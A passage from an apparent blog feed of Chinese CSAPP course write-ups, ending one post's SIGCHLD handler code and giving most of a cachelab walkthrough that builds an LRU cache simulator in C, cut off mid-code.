如果是因为一个未被捕获的信号造成了子进程的终止，那么就返回真<br><strong>WIFSTOPPED(status)</strong>: 如果引起返回的子进程当前是暂停的，那么就返回真。</p></blockquote><p>完整代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED) ) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">            <span class="comment">// 如果正常终止</span></span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line">            <span class="comment">// 收到信号终止（为了能监控其他进程）</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal 2\n&quot;</span>, pid2jid(pid), pid);</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            <span class="comment">// 如果进程停止</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal 20\n&quot;</span>, pid2jid(pid), pid);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> C语言 </tag>
            
            <tag> 信号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CMU 15-213 CSAPP】详解cachelab——模拟缓存、编写缓存友好代码</title>
      <link href="/2024/02/18/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3cachelab%E2%80%94%E2%80%94%E6%A8%A1%E6%8B%9F%E7%BC%93%E5%AD%98%E3%80%81%E7%BC%96%E5%86%99%E7%BC%93%E5%AD%98%E5%8F%8B%E5%A5%BD%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/02/18/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3cachelab%E2%80%94%E2%80%94%E6%A8%A1%E6%8B%9F%E7%BC%93%E5%AD%98%E3%80%81%E7%BC%96%E5%86%99%E7%BC%93%E5%AD%98%E5%8F%8B%E5%A5%BD%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是15-213 CSAPP系列课程配套实验cachelab的题解，实验分为两个部分：<br>一、编写缓存模拟器(cache simulator)，模拟地址与缓存之间的映射关系<br>二、编写缓存友好(cache-friendly)代码，从而优化矩阵转置</p><p>碎碎念：cachelab可以用c语言写，终于不用在gdb一行行看汇编了。</p><p>参考资料：</p><p>课程视频链接：<a href="https://www.bilibili.com/video/BV1iW411d7hd">2015 CMU 15-213 CSAPP 深入理解计算机系统 课程视频</a></p><p>实验文档：<a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">cachelab.dvi (cmu.edu)</a></p><p>getopt编译错误：<a href="https://blog.csdn.net/qq_44839144/article/details/128067523">编译错误 error: implicit declaration of function ‘getopt’ [-Werror=implicit-function-declaration] 解决方法-CSDN博客</a></p><p>PartB思路参考：<br><a href="https://www.jianshu.com/p/e68dd8305e9c#fnref1">CSAPP Cache Lab 缓存实验 - 简书 (jianshu.com)</a><br><a href="https://zhuanlan.zhihu.com/p/387662272">CSAPP - Cache Lab的更(最)优秀的解法 - 知乎 (zhihu.com)</a></p><hr><h1 id="Part-A-编写缓存模拟器"><a href="#Part-A-编写缓存模拟器" class="headerlink" title="Part A: 编写缓存模拟器"></a>Part A: 编写缓存模拟器</h1><h2 id="1-实验目标"><a href="#1-实验目标" class="headerlink" title="1. 实验目标"></a>1. 实验目标</h2><p>在csim.c中编写代码，后编译生成可执行文件，要求该文件接收traces目录下的文件作为输入，得到的输出与参考文件csim-ref执行同样操作得到的结果一致。</p><p><del>那不就跟打OJ一样嘛！而且每个样例都给我们了，直接面向样例编程不就好了（bushi</del></p><p>言归正传，既然是给定了输入输出，那么csim这个黑盒做了什么事情呢？</p><h3 id="1-Trace-Files"><a href="#1-Trace-Files" class="headerlink" title="(1) Trace Files"></a>(1) Trace Files</h3><p>首先，traces目录下的每个文件中，有一行行的操作指令，每条指令格式如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure><br><strong>operation</strong>代表操作，包括：<strong>L 读操作(Load)</strong>，<strong>S 写操作(Save)</strong>，<strong>M 读操作 + 写操作(Modify)</strong></p><p><strong>address</strong>代表<strong>64位地址</strong>，我们需要将该地址分割成 <strong>有效位valid</strong>，<strong>组索引set index</strong>，<strong>块偏移block offset</strong>，再映射到缓存中进行以上操作</p><p><strong>size</strong>代表上述操作涉及到的<strong>字节数</strong></p><h3 id="2-csim-ref"><a href="#2-csim-ref" class="headerlink" title="(2) csim-ref"></a>(2) csim-ref</h3><p>既然要模拟csim-ref，那就看看csim-ref的输入输出长什么样，在命令行中是这么调用csim-ref的：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br></pre></td></tr></table></figure><br><strong>-t</strong> 指定一个trace file，然后在分析里面每个操作对缓存的影响，是hit还是miss，有没有eviction<br><strong>-h</strong> 表示打印帮助信息，<strong>-v</strong>表示打印每个操作的分析结果<br><strong>-s</strong> 指定<strong>组索引的位数</strong>，<strong>-E</strong> 指定<strong>每组的行数</strong>，<strong>-b</strong> 指定<strong>块偏移的位数</strong></p><p>示例如下：</p><p>没有-v：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</span></span><br><span class="line">hits:4 misses:5 evictions:3</span><br></pre></td></tr></table></figure></p><p>有-v：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace</span></span><br><span class="line">L 10,1 miss</span><br><span class="line">M 20,1 miss hit</span><br><span class="line">L 22,1 hit</span><br><span class="line">S 18,1 hit</span><br><span class="line">L 110,1 miss eviction</span><br><span class="line">L 210,1 miss eviction</span><br><span class="line">M 12,1 miss eviction hit</span><br><span class="line">hits:4 misses:5 evictions:3</span><br></pre></td></tr></table></figure><br>使用-h：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/cachelab-handout# ./csim-ref -h</span><br><span class="line">Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;</span><br><span class="line">Options:</span><br><span class="line">  -h         Print this help message.</span><br><span class="line">  -v         Optional verbose flag.</span><br><span class="line">  -s &lt;num&gt;   Number of set index bits.</span><br><span class="line">  -E &lt;num&gt;   Number of lines per set.</span><br><span class="line">  -b &lt;num&gt;   Number of block offset bits.</span><br><span class="line">  -t &lt;file&gt;  Trace file.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"><span class="meta prompt_">  linux&gt; </span><span class="language-bash"> ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</span></span><br><span class="line"><span class="meta prompt_">  linux&gt; </span><span class="language-bash"> ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace</span></span><br></pre></td></tr></table></figure><br>错误输入：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/cachelab-handout# ./csim-ref -v -s 4 -E 1  -t traces/andrew.trace</span><br><span class="line">./csim-ref: Missing required command line argument</span><br><span class="line">Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;</span><br><span class="line">Options:</span><br><span class="line">  -h         Print this help message.</span><br><span class="line">  -v         Optional verbose flag.</span><br><span class="line">  -s &lt;num&gt;   Number of set index bits.</span><br><span class="line">  -E &lt;num&gt;   Number of lines per set.</span><br><span class="line">  -b &lt;num&gt;   Number of block offset bits.</span><br><span class="line">  -t &lt;file&gt;  Trace file.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"><span class="meta prompt_">  linux&gt; </span><span class="language-bash"> ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</span></span><br><span class="line"><span class="meta prompt_">  linux&gt; </span><span class="language-bash"> ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace</span></span><br></pre></td></tr></table></figure><br>文件不存在：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/cachelab-handout# ./csim-ref -v -s 4 -E 1 -b 4 -t traces/andrew.trace</span><br><span class="line">traces/andrew.trace: No such file or directory</span><br></pre></td></tr></table></figure></p><h2 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2. 编写代码"></a>2. 编写代码</h2><h3 id="1-读取命令行输入"><a href="#1-读取命令行输入" class="headerlink" title="(1) 读取命令行输入"></a>(1) 读取命令行输入</h3><p><strong>unistd.h</strong>提供了getopt()用于解析命令行参数，getopt的前两个参数同main函数的参数，第三个参数为一个字符串，格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> opts[<span class="number">16</span>] = <span class="string">&quot;hvs:E:b:t:&quot;</span>;</span><br></pre></td></tr></table></figure><p>其中，<strong>不带冒号</strong>表示<strong>无参数</strong>，带<strong>一个冒号</strong>表示<strong>必须有参数</strong>，带<strong>两个冒号</strong>则表示<strong>参数可选</strong></p><p>在本例中，-h和-v不带参数，-s -E -b 和 -t必须带参数。</p><p><strong>注意</strong>：实验提供的编译参数无法使用getopt，应当在Makefile中将CFLAGS作如下修改<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># CFLAGS = -g -Wall -Werror -std=c99 -m64</span><br><span class="line">CFLAGS = -g -Wall -Werror -std=gnu99 -m64</span><br></pre></td></tr></table></figure></p><p>getopt()返回得到匹配的字符，并且设置全局变量optarg为匹配到的参数，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> helper[<span class="number">1024</span>] = <span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;-h         Print this help message.\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;-v         Optional verbose flag.\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;-s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;-E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;-b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;-t &lt;file&gt;  Trace file.\n\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;Examples:\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span></span><br><span class="line">                        <span class="string">&quot;linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> display = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> s = <span class="number">0</span>, E = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> tracefile[MAX_FILENAME_LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// get params from command line</span></span><br><span class="line">    <span class="type">int</span> ch;</span><br><span class="line">    <span class="keyword">while</span> ((ch = getopt(argc, argv, opts)) != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, helper);   </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                display = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                E = atoi(optarg); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%s&quot;</span>, tracefile);  </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>上述步骤便完成了对命令行参数的解析和保存</p><p>更多异常处理如下：</p><p>如果缺少s或E或b：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make sure that s, E and b are valid</span></span><br><span class="line"><span class="keyword">if</span>(!s || !E || !b)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;./csim-ref: Missing required command line argument\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, helper);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果tracefile无法打开：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make sure that the tracefile is valid</span></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">fp = fopen(tracefile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: No such file or directory\n&quot;</span>, tracefile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-定义缓存"><a href="#2-定义缓存" class="headerlink" title="(2) 定义缓存"></a>(2) 定义缓存</h3><p>已知$S = 2^s$为缓存总共的组数，$E$为每一组的行数，而每一行包含<strong>有效位valid</strong>，<strong>标记tag</strong>以及长度为$B = 2^b$的高速缓存块。</p><p>由于在本题中，我们不需要处理缓存保存的实际内容，所以高速缓存块是什么可以忽略。</p><p>此外，文档指定缓存的替换策略为<strong>最近最少使用(Least-recently used, LRU)</strong>，也就是说，会替换<strong>最后一次访问时间最久远</strong>的那一行。因此需要在定义 行 的结构体时，增加一个<strong>时间戳stamp</strong>表示最后一次访问该行的时间</p><p>定义 行 的结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> valid;</span><br><span class="line">    <span class="type">int</span> tag;</span><br><span class="line">    <span class="type">long</span> stamp;</span><br><span class="line">&#125;line;</span><br></pre></td></tr></table></figure></p><p>获取当前时间的时间戳的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">get_stamp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    gettimeofday(&amp;tv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> tv.tv_usec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意不是 <strong>最不常使用(least-frequently-used，LFU)</strong>：替换在过去某个时间窗口内引用次数最少的那一行，如果是这个策略的话，需要记录的是被使用的次数cnt，一开始没分清然后几个样例过不去。</p><p>那么，<strong>缓存cache</strong>就是<strong>元素为结构体line的二维数组</strong>，用malloc动态分配内存如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// init our cache before process with each row </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> setSize = <span class="keyword">sizeof</span>(line) * E;</span><br><span class="line"><span class="type">int</span> S = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">line **cache;</span><br><span class="line">cache = (line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(line*) * S);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; S; ++i)&#123;</span><br><span class="line">    cache[i] = (line*)<span class="built_in">malloc</span>(setSize);</span><br><span class="line">    <span class="built_in">memset</span>(cache[i], <span class="number">0</span>, setSize);      <span class="comment">// valid = 0, stamp = 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意将有效位和时间戳都初始化为0</p><h3 id="3-处理操作"><a href="#3-处理操作" class="headerlink" title="(3) 处理操作"></a>(3) 处理操作</h3><p>由于我们只需要分析数据对缓存的影响，可以忽略对指令的操作，也就是<strong>读到第一个字符是I的可以直接跳过</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// process with each row</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> rowSize = <span class="number">64</span>;</span><br><span class="line"><span class="type">char</span> *row = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * rowSize);</span><br><span class="line"><span class="keyword">while</span>(fgets(row, rowSize, fp) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(row[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><br>对于操作L，S 和M，就需要保存<strong>操作类型op</strong>，<strong>地址addr</strong>和<strong>size</strong>用于 -v时候的输出<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get operation, address and size from each row</span></span><br><span class="line"><span class="type">char</span> op;</span><br><span class="line"><span class="type">long</span> addr;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">sscanf</span>((row[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) ? row + <span class="number">1</span>: row, <span class="string">&quot;%c %lx,%d&quot;</span>, &amp;op, &amp;addr, &amp;size);</span><br><span class="line"><span class="keyword">if</span>(display)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c %lx, %d &quot;</span>, op, addr, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里使用 <strong>(row[0] == ‘ ‘) ? row + 1: row</strong> 是因为tracefile中有I操作时，其他操作前面会多一个空格</p><p>将addr分割为 <strong>有效位valid</strong>，<strong>组索引set index</strong>和<strong>块偏移block offset</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get tag, set index and block offset;</span></span><br><span class="line"><span class="comment">// int block_offset = (int) (addr % (1 &lt;&lt; b));</span></span><br><span class="line">addr /= (<span class="number">1</span> &lt;&lt; b);</span><br><span class="line"><span class="type">int</span> set_index = (<span class="type">int</span>)(addr % (<span class="number">1</span> &lt;&lt; s));</span><br><span class="line">addr /= (<span class="number">1</span> &lt;&lt; s);</span><br><span class="line"><span class="type">int</span> tag = (<span class="type">int</span>)addr;</span><br></pre></td></tr></table></figure><br>block_offset用不到，其实也可以不用存，存了会报错unused variable</p><p>根据set_index定义到缓存中对应组，找到组中tag与地址的tag相等，并且有效位valid为1的一行<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find line in cache</span></span><br><span class="line"><span class="type">int</span> hitTag = <span class="number">0</span>, hitIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; E; ++i )&#123;</span><br><span class="line">    <span class="keyword">if</span>(cache[set_index][i].valid &amp;&amp; cache[set_index][i].tag == tag)&#123;</span><br><span class="line">        hitTag = <span class="number">1</span>;</span><br><span class="line">        hitIndex = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>处理hit和miss</strong><br>hit很好处理，直接修改对应行的时间戳，需要打印结果就打印结果<br>miss就得根据LRU找到需要覆盖的行，如果该行是valid的，说明出现了eviction<br>由于<strong>M操作</strong>相当于L操作+S操作，也就是一读一写，并且观察到写操作肯定是hit。因此如果发现是M操作，就在<strong>后边加一次hit计数</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(hitTag)&#123; <span class="comment">// hit</span></span><br><span class="line">        ++hits;</span><br><span class="line">        <span class="keyword">if</span>(display)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        cache[set_index][hitIndex].stamp = get_stamp();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  <span class="comment">// miss</span></span><br><span class="line">        ++misses;</span><br><span class="line">        <span class="keyword">if</span>(display)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        <span class="comment">// find LRU line</span></span><br><span class="line">        hitIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; E; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cache[set_index][i].stamp &lt; cache[set_index][hitIndex].stamp)</span><br><span class="line">                hitIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cache[set_index][hitIndex].valid)&#123;</span><br><span class="line">            ++evictions;</span><br><span class="line">            <span class="keyword">if</span>(display)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">        &#125;    </span><br><span class="line">        cache[set_index][hitIndex].valid = <span class="number">1</span>;</span><br><span class="line">        cache[set_index][hitIndex].tag = tag;</span><br><span class="line">        cache[set_index][hitIndex].stamp = get_stamp();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(op == <span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">        ++hits;</span><br><span class="line">        <span class="keyword">if</span>(display)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        cache[set_index][hitIndex].stamp = get_stamp();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(display)</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="4-输出结果"><a href="#4-输出结果" class="headerlink" title="(4) 输出结果"></a>(4) 输出结果</h3><p>程序末尾释放malloc的内存当然是好习惯啦：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 